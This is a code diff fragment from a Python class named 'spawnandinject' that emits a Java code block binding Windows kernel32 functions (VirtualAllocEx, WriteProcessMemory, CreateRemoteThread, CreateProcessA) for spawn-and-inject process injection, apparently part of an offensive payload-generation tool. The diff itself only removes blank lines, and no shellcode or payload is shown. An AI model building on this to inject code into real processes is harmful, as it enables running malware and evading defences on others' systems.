@@ -22,28 +22,18 @@ class spawnandinject:
 
     def codeblocks(self) -> str:
         return """
-
     private static final Linker LINKER = Linker.nativeLinker();
-
     private static final MemoryLayout C_INT     = LINKER.canonicalLayouts().get("int");
     private static final MemoryLayout C_LONG_LONG     = LINKER.canonicalLayouts().get("long long");
     private static final MemoryLayout C_POINTER = LINKER.canonicalLayouts().get("void*");
     private static final MemoryLayout C_BOOL = LINKER.canonicalLayouts().get("bool");
-
     public static Arena arena = Arena.ofConfined();
-
     public static SymbolLookup kernel32 = SymbolLookup.libraryLookup("kernel32.dll", arena);
-
     public static MethodHandle VirtualAllocEx = LINKER.downcallHandle(kernel32.find("VirtualAllocEx").orElseThrow(),FunctionDescriptor.of(C_POINTER, C_LONG_LONG, C_POINTER, C_LONG_LONG, C_INT, C_INT));
-
     public static MethodHandle WriteProcessMemory = LINKER.downcallHandle(kernel32.find("WriteProcessMemory").orElseThrow(),FunctionDescriptor.of(C_BOOL, C_LONG_LONG, C_POINTER, C_POINTER, C_LONG_LONG, C_POINTER));
-
     public static MethodHandle CreateRemoteThread = LINKER.downcallHandle(kernel32.find("CreateRemoteThread").orElseThrow(),FunctionDescriptor.of(C_LONG_LONG, C_LONG_LONG, C_POINTER, C_LONG_LONG, C_POINTER, C_POINTER, C_INT, C_POINTER));
-
     public static MethodHandle WaitForSingleObject = LINKER.downcallHandle(kernel32.find("WaitForSingleObject").orElseThrow(),FunctionDescriptor.of(C_INT, C_LONG_LONG, C_INT));
-
     public static MethodHandle CreateProcessA = LINKER.downcallHandle(kernel32.find("CreateProcessA").orElseThrow(),FunctionDescriptor.of(C_BOOL, C_POINTER, C_POINTER, C_POINTER, C_POINTER, C_BOOL, C_INT, C_POINTER, C_POINTER, C_POINTER, C_POINTER));    
-
 """
 
     def template(self) -> str:
